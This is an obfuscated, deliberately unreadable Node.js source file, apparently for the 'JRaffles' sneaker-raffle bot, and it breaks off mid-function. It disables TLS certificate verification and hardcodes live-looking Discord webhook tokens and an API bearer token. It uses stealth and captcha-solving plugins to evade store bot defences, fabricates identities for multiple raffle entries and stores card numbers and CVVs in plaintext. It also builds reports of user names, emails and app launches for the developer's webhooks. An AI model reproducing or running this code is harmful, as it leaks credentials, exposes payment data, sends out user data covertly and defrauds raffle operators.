process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x3f4ea0 = require('fs'), _0x425c11 = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x392a1e(_0x2a154f) {
    const _0x171099 = _0x3f4ea0['createWriteStream'](_0x2a154f, { 'flags': 'a' }), _0x5a56d0 = console['log'];
    console['log'] = function () {
        const _0x254602 = Array['prototype']['slice']['call'](arguments), _0x50f1b7 = _0x254602['join']('\x20') + '\x0a';
        _0x171099['write'](_0x50f1b7), _0x5a56d0['apply'](console, _0x254602);
    };
}
_0x392a1e('../logs/log\x20' + _0x425c11);
var _0x4f3dd1 = require('tough-cookie'), _0xda3ce2 = require('node-imap'), _0x22d544 = require('util')['inspect'];
const _0x482936 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x2fa330 } = require('discord.js');
var _0x5a39d2 = require('exe');
const { execFile: _0x415db3 } = require('child_process'), _0x40dba9 = require('puppeteer-extra'), _0x4a8825 = require('cross-spawn'), _0x20d185 = require('puppeteer-extra-plugin-recaptcha'), _0xa1d034 = require('puppeteer-extra-plugin-stealth'), _0xe2a5bb = require('chalk'), _0x9f07d8 = require('node-bash-title'), _0x3e71cb = require('axios'), _0x55493a = require('papaparse');
var _0xc808f = require('random-name');
const _0x5f0eca = require('request');
var _0x255b95 = require('prompt');
const _0x26fd4b = _0x5f0eca['jar']();
var _0x11db88 = {};
const _0x24d16e = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x41da3f = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x131169 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x3bfce7 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x32ddb5 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x1e757b = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x5799ae = 'https://discord.com/api/webhooks/', _0x3739f7 = '' + _0x5799ae + _0x131169, _0x16a6f5 = '' + _0x5799ae + _0x3bfce7, _0x19b823 = '' + _0x5799ae + _0x24d16e, _0x877ec9 = '' + _0x5799ae + _0x41da3f, _0x122725 = '' + _0x5799ae + _0x32ddb5, _0x4b5f16 = '' + _0x5799ae + _0x1e757b;
const _0x88ec60 = JSON['parse'](_0x3f4ea0['readFileSync']('country.json', 'utf-8')), _0x41561c = JSON['parse'](_0x3f4ea0['readFileSync']('../package.json', 'utf-8')), _0x3c77f4 = _0x41561c['version'];
var _0x4870c9, _0x23b918, _0x5a52a4, _0x1ca46d, _0x3cef69, _0x1b5010, _0x94d398, _0x5ac866;
const _0x33ef1a = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0xb8a1d = ![];
const _0x4cde09 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x5dc324 = '0123456789';
var _0x54c572 = _0x4cde09['split']('');
const _0x3b6c87 = require('auto-git-update'), _0x390774 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0xf67494 = new _0x3b6c87(_0x390774);
async function _0x959471() {
    _0x3cef69 = _0x3f4ea0['readdirSync']('../proxies'), _0x1ca46d = _0x3f4ea0['readdirSync']('../tasks'), !_0x3f4ea0['existsSync']('../accounts/fenom.csv') && _0x3f4ea0['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x3f4ea0['existsSync']('../accounts/paypal.csv') && _0x3f4ea0['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x3f4ea0['existsSync']('../accounts/bstn.csv') && _0x3f4ea0['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x3f4ea0['existsSync']('../accounts/eql.csv') && _0x3f4ea0['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x3f4ea0['existsSync']('../failed-tasks.csv') && _0x3f4ea0['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x3f4ea0['existsSync']('../successful-tasks.csv') && _0x3f4ea0['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x11db88 = JSON['parse'](_0x3f4ea0['readFileSync']('../settings.json', 'utf-8')), !_0x11db88['delay'] && (_0x11db88['delay'] = 0x3c, _0x3f4ea0['writeFileSync']('../settings.json', JSON['stringify'](_0x11db88, null, 0x2))), !_0x11db88['threads'] && (_0x11db88['threads'] = 0x1, _0x3f4ea0['writeFileSync']('../settings.json', JSON['stringify'](_0x11db88, null, 0x2))), !_0x11db88['python'] && (_0x4a8825('start', [
        'cmd',
        '/k',
        'py\x20-m\x20pip\x20install\x20-r\x20modules/Confirmed/requirements.txt'
    ], { 'shell': !![] }), _0x4a8825('start', [
        'cmd',
        '/k',
        'py\x20-m\x20pip\x20install\x20git+https://github.com/66niko99/py-adyen-encrypt.git'
    ], { 'shell': !![] }), _0x11db88['python'] = 'uptodate', _0x3f4ea0['writeFileSync']('../settings.json', JSON['stringify'](_0x11db88, null, 0x2))), !_0x11db88['masterMail'] && (_0x11db88['masterMail'] = 'yourmail@gmail.com', _0x3f4ea0['writeFileSync']('../settings.json', JSON['stringify'](_0x11db88, null, 0x2))), !_0x11db88['CapSolver'] && (_0x11db88['CapSolver'] = 'yourkeyhere', _0x3f4ea0['writeFileSync']('../settings.json', JSON['stringify'](_0x11db88, null, 0x2))), !_0x11db88['masterPassword'] && (_0x11db88['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x3f4ea0['writeFileSync']('../settings.json', JSON['stringify'](_0x11db88, null, 0x2))), !_0x11db88['captchaKey'] && (_0x11db88['captchaKey'] = '', _0x3f4ea0['writeFileSync']('../settings.json', JSON['stringify'](_0x11db88, null, 0x2))), !_0x11db88['useRandomProxy'] && (_0x11db88['useRandomProxy'] = !![], _0x3f4ea0['writeFileSync']('../settings.json', JSON['stringify'](_0x11db88, null, 0x2))), !_0x11db88['shuffleTasks'] && (_0x11db88['shuffleTasks'] = ![], _0x3f4ea0['writeFileSync']('../settings.json', JSON['stringify'](_0x11db88, null, 0x2))), !_0x11db88['webhook'] && (_0x11db88['webhook'] = '', _0x3f4ea0['writeFileSync']('../settings.json', JSON['stringify'](_0x11db88, null, 0x2))), _0x11db88['delay'] <= 0x1388 && (_0x11db88['delay'] = _0x11db88['delay'] * 0x3e8), _0x11db88['AfewDelay'] && (delete _0x11db88['AfewDelay'], _0x3f4ea0['writeFileSync']('../settings.json', JSON['stringify'](_0x11db88, null, 0x2))), _0x11db88['MahaDelay'] && (delete _0x11db88['MahaDelay'], _0x3f4ea0['writeFileSync']('../settings.json', JSON['stringify'](_0x11db88, null, 0x2))), _0x11db88['footshopDelay'] && (delete _0x11db88['footshopDelay'], _0x3f4ea0['writeFileSync']('../settings.json', JSON['stringify'](_0x11db88, null, 0x2))), _0x11db88['MahaDelay'] = _0x11db88['delay'], _0x5799ae = _0x11db88['webhook'], _0x1b5010 = _0x11db88['licenseKey'];
}
let _0x4f425a, _0x58edef = [], _0x3341e8;
const _0x558aee = _0x20265e => new Promise(_0x3f072c => setTimeout(_0x3f072c, _0x20265e));
function _0x3e9320(_0x276099, _0x2bfd06) {
    return Math['floor'](Math['random']() * (_0x2bfd06 - _0x276099 + 0x1) + _0x276099);
}
function _0x333bb0(_0xbfc787) {
    let _0x43b395 = _0xbfc787['length'], _0x2a9a8e;
    while (_0x43b395 != 0x0) {
        _0x2a9a8e = Math['floor'](Math['random']() * _0x43b395), _0x43b395--, [_0xbfc787[_0x43b395], _0xbfc787[_0x2a9a8e]] = [
            _0xbfc787[_0x2a9a8e],
            _0xbfc787[_0x43b395]
        ];
    }
    return _0xbfc787;
}
async function _0x3de3c9(_0x20e3c1) {
    try {
        return _0x3e71cb['post']('https://api.whop.com/api/v2/memberships/' + _0x20e3c1 + '/validate_license', { 'metadata': { 'key': '' } }, {
            'headers': {
                'Authorization': 'Bearer\x20DRT4qDTPjhk0dbWMnuTDrMuGiUh6MogGpjZL6gSDoLU',
                'Content-Type': 'application/json'
            }
        });
    } catch (_0x342b2d) {
        console['log']('Error\x20checking\x20license:\x20' + _0x342b2d['message']);
    }
}
async function _0x404400(_0x374a72) {
    console['clear']();
    if (_0x374a72 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x44a460 = await _0x255b95['get']('License');
        if (_0x44a460['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x558aee(0xbb8), _0x404400(_0x374a72);
        _0x374a72 = _0x44a460['License'], _0x11db88['licenseKey'] = _0x374a72, _0x1b5010 = _0x374a72, _0x3f4ea0['writeFileSync']('../settings.json', JSON['stringify'](_0x11db88));
    }
    console['log']('Checking\x20license\x20' + _0x1b5010 + '...'), await _0x558aee(0x320);
    const _0x57aebb = await _0x3de3c9(_0x374a72);
    _0x94d398 = JSON['stringify'](_0x57aebb['data']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x5ac866 = JSON['stringify'](_0x57aebb['data']['discord']['image_url'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x57aebb)
        return console['log']('License\x20not\x20found');
    if (!_0x57aebb['data'])
        return console['log']('License\x20not\x20bound');
    return _0x57aebb['data']['valid'] ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0xb8a1d = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0xb8a1d = ![]);
}
async function _0x409e1d() {
    var _0x154997 = await _0x255b95['get']('Module');
    return console['clear'](), _0x154997['Module'];
}
;
async function _0x4cdd98() {
    var _0x3ae1f9 = await _0x255b95['get']('Setting');
    return console['clear'](), _0x3ae1f9['Setting'];
}
async function _0x26b32a(_0x4c2978) {
    var _0x5805e1 = [];
    for (file of _0x1ca46d) {
        var _0xe2d398 = _0x3f4ea0['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x55493a['parse'](_0xe2d398, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x4c2978['store'] && _0x5805e1['push'](file);
    }
    !_0x5805e1['length'] == 0x0 && (_0x1ca46d = _0x5805e1);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x43b005 = 0x0; _0x43b005 < _0x1ca46d['length']; _0x43b005++) {
        console['log']('\x20(' + _0x43b005 + ')\x20' + _0x1ca46d[_0x43b005]);
    }
    console['log']('');
    var _0xe8c0d4 = await _0x255b95['get']('Task');
    if (_0xe8c0d4['Task'] > _0x1ca46d['length'] - 0x1 || isNaN(_0xe8c0d4['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x558aee(0x3e8), _0x26b32a();
    var _0x56f1f4 = _0x3f4ea0['readFileSync']('../tasks/' + _0x1ca46d[_0xe8c0d4['Task']], 'utf-8');
    return _0x5a52a4 = _0x55493a['parse'](_0x56f1f4, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0xe2a5bb['blue'](_0x1ca46d[_0xe8c0d4['Task']])), _0x4870c9 = _0x1ca46d[_0xe8c0d4['Task']], _0x5a52a4;
}
async function _0x3f2203() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x4606db = 0x0; _0x4606db < _0x3cef69['length']; _0x4606db++) {
        console['log']('\x20(' + _0x4606db + ')\x20' + _0x3cef69[_0x4606db]);
    }
    console['log']('');
    var _0x27c8d2 = await _0x255b95['get']('Proxies');
    if (_0x27c8d2['Proxies'] > _0x3cef69['length'] - 0x1 || isNaN(_0x27c8d2['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x558aee(0x3e8), _0x3f2203();
    var _0x141672 = _0x3f4ea0['readFileSync']('../proxies/' + _0x3cef69[_0x27c8d2['Proxies']], 'utf-8')['split']('\x0a');
    let _0x5d96a0 = _0x141672['map']((_0x1de561, _0x509aad) => {
        sanatizeProxy = _0x1de561['replace']('\x0d', '');
        if (_0x141672[_0x509aad + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x23b918 = _0x3cef69[_0x27c8d2['Proxies']], console['clear'](), _0x5d96a0;
}
async function _0xad5517() {
    var _0x1f72c3 = await _0x255b95['get']('Value');
    return console['clear'](), _0x1f72c3['Value'];
}
async function _0x1b5a46(_0x2ec7fa) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x2baa0e = 0x0; _0x2baa0e < _0x2ec7fa['length']; _0x2baa0e++) {
        console['log']('\x20(' + _0x2baa0e + ')\x20[' + _0x2ec7fa[_0x2baa0e]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x53554b = await _0x255b95['get']('Module');
    return _0x53554b['Module'];
}
async function _0x43756b() {
    var _0x3e85f0 = await _0x255b95['get']('Password');
    return console['clear'](), _0x3e85f0['Password'];
}
;
async function _0x13b9f7() {
    var _0x4fed05 = await _0x255b95['get']('Links');
    return _0x4fed05['Links'];
}
;
async function _0x1aa48c() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x101963 = 0x0; _0x101963 < _0x58edef['length']; _0x101963++) {
        console['log']('\x20(' + _0x101963 + ')\x20' + _0x58edef[_0x101963]);
    }
    ;
    console['log']();
    let _0x502afa = await _0x255b95['get']('Product');
    return console['clear'](), _0x502afa['Product'];
}
;
function _0xb9a031() {
    var _0x1db1d6 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x1db1d6;
}
;
function _0x53bf6d() {
    var _0x578bf1 = new Date(Date['now']())['toLocaleString']();
    return _0x578bf1['replace'](',', '');
}
async function _0x5a13a5(_0x3a85ff, _0x3998fc) {
    let _0x22f89b = { 'headers': { 'content-type': 'application/json' } };
    if (_0x3c77f4 != 'devkey') {
        await _0x3e71cb['post'](_0x3a85ff, _0x3998fc, _0x22f89b);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x459281(_0x2d0866, _0x281744, _0x4568f0, _0x9c93ee, _0x10cf9b) {
    if (!_0x9c93ee && _0x4568f0 == 'dev') {
        var _0x3f9d6a = new _0x2fa330()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x281744['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x281744['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x2d0866['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x11db88['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x94d398,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x2d0866['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x2d0866['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x3c77f4,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x3f9d6a['data'];
    } else {
        if (_0x9c93ee && _0x4568f0 == 'dev') {
            var _0x3f9d6a = new _0x2fa330()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x281744['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x94d398,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x281744['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x2d0866['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x11db88['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x10cf9b,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x2d0866['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x2d0866['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x3c77f4,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x3f9d6a['data'];
        } else {
            if (_0x4568f0 == 'pub') {
                var _0x3f9d6a = new _0x2fa330()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x281744['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x281744['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x2d0866['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x11db88['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x2d0866['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x3c77f4,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x3f9d6a['data'];
            } else {
                if (_0x4568f0 == 'acc' && !_0x9c93ee) {
                    var _0x3f9d6a = new _0x2fa330()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x281744['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x94d398,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x281744['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x11db88['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x3c77f4,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x3f9d6a['data'];
                } else {
                    if (_0x4568f0 == 'acc' && _0x9c93ee) {
                        var _0x3f9d6a = new _0x2fa330()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x281744['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x94d398,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x10cf9b,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x281744['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x11db88['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x3c77f4,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x3f9d6a['data'];
                    } else {
                        if (_0x4568f0 == 'open') {
                            var _0x3f9d6a = new _0x2fa330()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x5ac866)['addFields']({
                                'name': 'User',
                                'value': '' + _0x94d398,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x3c77f4,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x3f9d6a['data'];
                        } else {
                            if (!_0x9c93ee && _0x4568f0 == 'ver') {
                                var _0x3f9d6a = new _0x2fa330()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x281744['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x94d398,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x281744['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x11db88['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x3c77f4,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x3f9d6a['data'];
                            } else {
                                if (_0x9c93ee && _0x4568f0 == 'ver') {
                                    var _0x3f9d6a = new _0x2fa330()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x281744['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x94d398,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x10cf9b,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x281744['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x11db88['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x3c77f4,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x3f9d6a['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x162b07(_0x57f9f1, _0x35d842) {
    var _0x1559ca = _0x57f9f1[_0x35d842]['Address1']['split'](''), _0x18d51a = _0x57f9f1[_0x35d842]['Address2']['split'](''), _0xc59596 = _0x57f9f1[_0x35d842]['Email']['split']('@');
    for (var _0x748cb4 = 0x0; _0x748cb4 < _0x1559ca['length']; _0x748cb4++) {
        if (_0x1559ca[_0x748cb4] == 'X') {
            var _0x1bf88f = Math['round'](Math['random']() * (_0x4cde09['length'] - 0x1));
            _0x1559ca[_0x748cb4] = _0x54c572[_0x1bf88f];
        }
    }
    ;
    for (var _0x748cb4 = 0x0; _0x748cb4 < _0x18d51a['length']; _0x748cb4++) {
        if (_0x18d51a[_0x748cb4] == 'X') {
            var _0x1bf88f = Math['round'](Math['random']() * (_0x4cde09['length'] - 0x1));
            _0x18d51a[_0x748cb4] = _0x54c572[_0x1bf88f];
        }
    }
    ;
    _0x57f9f1[_0x35d842]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x57f9f1[_0x35d842]['FirstName'] = _0xc808f['first']());
    _0x57f9f1[_0x35d842]['LastName']['toUpperCase']() == 'RANDOM' && (_0x57f9f1[_0x35d842]['LastName'] = _0xc808f['last']());
    _0xc59596[0x0]['toUpperCase']() == 'RANDOM' ? _0xc59596[0x0] = '' + _0xc808f['first']() + _0xc808f['last']() + _0x3e9320(0x1, 0x3e7) + '@' : _0xc59596[0x0] = _0xc59596[0x0] + '@';
    _0x57f9f1[_0x35d842]['Email'] = _0xc59596['join'](''), _0x57f9f1[_0x35d842]['Address1'] = _0x1559ca['join'](''), _0x57f9f1[_0x35d842]['Address2'] = _0x18d51a['join']('');
    _0x57f9f1[_0x35d842]['Phone'] == 'RANDOM' && (_0x57f9f1[_0x35d842]['Phone'] = '0' + _0x3e9320(0x5f5e100, 0x3b9ac9ff));
    if (_0x57f9f1[_0x35d842]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x4fb0a9 = _0x3e9320(0x1, 0x270f);
        _0x57f9f1[_0x35d842]['Follower'] = '' + _0xc808f['first']() + _0xc808f['last']() + _0x4fb0a9 + '\x20';
    }
    _0x57f9f1[_0x35d842]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x57f9f1[_0x35d842]['HouseNumber'] = _0x3e9320(0x1, 0xc8));
    if (_0x57f9f1[_0x35d842]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x1c8dcd = Math['round'](Math['random']() * (_0x4cde09['length'] - 0x1)), _0x1df6ee = _0x54c572[_0x1c8dcd];
        _0x57f9f1[_0x35d842]['Address1'] = _0xc808f['last']() + 'straat', _0x57f9f1[_0x35d842]['Zip'] == '' && (_0x57f9f1[_0x35d842]['Postcode'] = _0x3e9320(0x3e8, 0x270f) + '\x20' + _0x1df6ee + _0x1df6ee, _0x57f9f1[_0x35d842]['Zip'] = _0x57f9f1[_0x35d842]['Postcode']), _0x57f9f1[_0x35d842]['HouseNumber'] = '' + _0x3e9320(0x1, 0xc8);
    }
    return;
}
;
async function _0x15a8e9(_0xe0350b, _0x2f5d60) {
    _0x3f4ea0['appendFileSync']('../failed-tasks.csv', _0x53bf6d() + ',' + _0x2f5d60['store'] + ',' + _0x2f5d60['name'] + ',' + _0xe0350b['Url'] + ',' + _0xe0350b['Size'] + ',' + _0xe0350b['Follower'] + ',' + _0xe0350b['FirstName'] + ',' + _0xe0350b['LastName'] + ',' + _0xe0350b['Address1'] + ',' + _0xe0350b['Address2'] + ',' + _0xe0350b['HouseNumber'] + ',' + _0xe0350b['Zip'] + ',' + _0xe0350b['City'] + ',' + _0xe0350b['State'] + ',' + _0xe0350b['Country'] + ',' + _0xe0350b['Phone'] + ',' + _0xe0350b['Email'] + ',' + _0xe0350b['Password'] + ',' + _0xe0350b['PaymentMethod'] + ',' + _0xe0350b['CardType'] + ',' + _0xe0350b['NameOnCard'] + ',' + _0xe0350b['CardNumber'] + ',' + _0xe0350b['ExpiryDate'] + ',' + _0xe0350b['CVV'] + ',' + _0xe0350b['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x10fee2(_0x6fb40f, _0x2cb8c8) {
    _0x3f4ea0['appendFileSync']('../successful-tasks.csv', _0x53bf6d() + ',' + _0x2cb8c8['store'] + ',' + _0x2cb8c8['name'] + ',' + _0x6fb40f['Url'] + ',' + _0x6fb40f['Size'] + ',' + _0x6fb40f['Follower'] + ',' + _0x6fb40f['FirstName'] + ',' + _0x6fb40f['LastName'] + ',' + _0x6fb40f['Address1'] + ',' + _0x6fb40f['Address2'] + ',' + _0x6fb40f['HouseNumber'] + ',' + _0x6fb40f['Zip'] + ',' + _0x6fb40f['City'] + ',' + _0x6fb40f['State'] + ',' + _0x6fb40f['Country'] + ',' + _0x6fb40f['Phone'] + ',' + _0x6fb40f['Email'] + ',' + _0x6fb40f['Password'] + ',' + _0x6fb40f['PaymentMethod'] + ',' + _0x6fb40f['CardType'] + ',' + _0x6fb40f['NameOnCard'] + ',' + _0x6fb40f['CardNumber'] + ',' + _0x6fb40f['ExpiryDate'] + ',' + _0x6fb40f['CVV'] + ',' + _0x6fb40f['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x12afa2() {
    let _0x136adb = proxyFile['split']('\x0a'), _0x144070 = _0x136adb['map']((_0x55e6e1, _0x23b3ce) => {
        sanatizeProxy = _0x55e6e1['replace']('\x0d', '');
        if (_0x136adb[_0x23b3ce + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x144070;
}
;
async function _0x45708e(_0x3d2dd8, _0x2ce6a2) {
    if (_0x127fe9 != 'yes')
